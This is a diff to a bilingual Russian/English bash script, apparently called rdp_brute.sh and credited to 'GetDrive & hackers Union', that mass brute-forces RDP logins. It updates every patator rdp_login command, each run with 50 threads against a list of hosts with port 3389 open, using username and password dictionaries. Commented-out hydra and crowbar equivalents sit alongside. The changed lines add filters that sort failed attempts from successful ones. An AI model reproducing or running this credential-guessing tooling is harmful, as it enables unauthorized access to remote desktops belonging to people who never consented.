@@ -104,7 +104,7 @@ clear
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |            Version 1.12             |"
+echo -e        "$red                     |            Version 1.13             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
@@ -361,7 +361,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
 echo "" 
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1  -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -393,7 +393,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -422,7 +422,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -443,7 +443,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users  -C $PWD/dictionary/pass -S $PWD/open 
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -498,7 +498,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -528,7 +528,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -558,7 +558,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -574,7 +574,7 @@ echo -e "                              $green Start bruteforceing "
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dictionary/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; exit; ./rdp_brute.sh' 2
